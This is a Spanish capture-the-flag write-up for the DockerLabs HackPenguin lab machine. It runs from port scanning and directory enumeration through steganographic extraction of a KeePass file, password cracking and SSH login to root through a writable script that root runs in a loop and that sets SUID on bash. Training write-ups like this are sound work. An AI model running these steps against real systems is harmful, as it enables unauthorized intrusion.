---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `Steganography` `Cryptography` `KeePass` `ps aux` `SUID` 

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip hackpenguin.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh hackpenguin.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 17:08 +0100
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:13:95:24:c7:08:e8:36:51:6d:ab:b2:e5:3e:3b:da (ECDSA)
|_  256 e2:f3:81:1f:7d:d0:ea:ed:e0:c6:38:11:ed:95:3a:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```

Accedemos al puerto `80` y encontramos la página por defecto de `Apache2`.

## GOBUSTER

Utilizamos `Gobuster` para enumerar directorios y archivos en el servidor web.

```Bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh,asp,aspx -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,php,txt,bak,sh,asp,aspx,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10671]
/penguin.html         (Status: 200) [Size: 342]
Progress: 1242513 / 1985013 (62.59%)
```

Descubrimos el archivo `/penguin.html`. Accedemos a él y vemos una imagen.

![](../../images/penguin.png)

Descargamos la foto `penguin.jpg` a nuestra máquina local para analizar si contiene información oculta mediante `esteganografía`.

## ESTEGANOGRAFÍA

Intentamos extraer información con `steghide`.

```Bash
steghide extract -sf penguin.jpg
```

La herramienta nos pide una `passphrase` que no tenemos. 

Para obtenerla, utilizamos `stegseek` junto con el diccionario `rockyou.txt`.

```Bash
stegseek penguin.jpg /usr/share/wordlists/rockyou.txt
```

Info:
```
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "chocolate"        

[i] Original filename: "penguin.kdbx".
[i] Extracting to "penguin.jpg.out".
```

Hemos encontrado la contraseña: `chocolate`. Al extraer el contenido, obtenemos un archivo llamado `penguin.kdbx`, que corresponde a una base de datos de `KeePass`.

## CRACKING KEEPASS

Para abrir el archivo `.kdbx` necesitamos una contraseña maestra. Primero, extraemos el `hash` del archivo utilizando `keepass2john`.

```Bash
keepass2john penguin.kdbx > hash.txt
```

A continuación, utilizamos `John the Ripper` para crackear el `hash`.

```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Info:
```
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (penguin)     
1g 0:00:00:00 DONE (2026-02-18 17:15) 2.941g/s 94.11p/s 94.11c/s 94.11C/s tigger..butterfly
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Obtenemos la contraseña: `password1`.

Abrimos la base de datos de `KeePass`.

```Bash
keepass2 penguin.kdbx
# password: password1
```

Dentro encontramos las siguientes credenciales:

```
Usuario: pinguino
Contraseña: pinguinomaravilloso123
```

Intentamos acceder por `SSH` con el usuario `pinguino`, pero fallamos. 

Probamos con el usuario `penguin` y la contraseña obtenida.

```Bash
ssh penguin@172.17.0.2
```

Logramos acceder al sistema.

## ESCALADA DE PRIVILEGIOS

Una vez dentro, enumeramos el directorio `/home/hackpenguin/`.

```Bash
ls -la /home/hackpenguin
```

```
total 28
drwxrwxrwx 1 root    root        4096 Feb 18 16:22 .
drwxr-xr-x 1 root    root        4096 Apr 15  2024 ..
drwx------ 2 penguin hackpenguin 4096 Feb 18 16:22 .cache
-rwxrwxrwx 1 root    root          22 Feb 18 16:24 archivo.txt
-rwxrwxrwx 1 root    root          20 Feb 18 16:24 script.sh
```

Encontramos un script llamado `script.sh` que pertenece a `root`, pero sobre el cual tenemos permisos de escritura `(rwxrwxrwx)`. 

Vamos a comprobar si existe algun proceso que esté ejecutando este script.

```bash
ps aux
```

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  3.4  0.0   2900  1792 ?        Ss   16:07   1:16 /bin/sh -c service apache2 start && service ssh start && while true; do /bin/bash /home/hackpenguin/script.sh; done
root          25  0.0  0.1   6788  4836 ?        Ss   16:07   0:00 /usr/sbin/apache2 -k start
www-data      31  1.2  0.1 1212916 7816 ?        Sl   16:07   0:27 /usr/sbin/apache2 -k start
www-data      59  1.3  0.1 1212908 7920 ?        Sl   16:07   0:29 /usr/sbin/apache2 -k start
root          92  0.0  0.1  15444  5540 ?        Ss   16:07   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
www-data  136751  1.2  0.1 1212908 7720 ?        Sl   16:09   0:27 /usr/sbin/apache2 -k start
root      975171  0.0  0.2  16740 11032 ?        Ss   16:22   0:00 sshd: penguin [priv]
penguin   982894  0.0  0.1  17000  7828 ?        R    16:22   0:00 sshd: penguin@pts/0
penguin   982907  0.0  0.0   2900  1908 pts/0    Ss   16:22   0:00 -sh
root     1083598  0.0  0.0   5056  3944 pts/0    S    16:24   0:00 bash -p
root     3010233  0.0  0.0   7492  3180 pts/0    R+   16:45   0:00 ps aux
```

Como podemos ver en la primera línea, el script está constantemente siendo ejecutado como el usuario `root`.

Modificamos el `script` para asignar permisos `SUID` al binario `/bin/bash`.

```Bash
echo 'chmod u+s /bin/bash' > script.sh
```

Esperamos un momento a que el script sea ejecutado por `root` y comprobamos los permisos de bash.

```Bash
ls -la /bin/bash
```
```
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Efectivamente, los permisos han cambiado y el bit SUID está activo. Ahora podemos obtener una `shell` como root.

```Bash
bash -p
```
```
bash-5.1# whoami
root
bash-5.1#
```

Ya somos root!
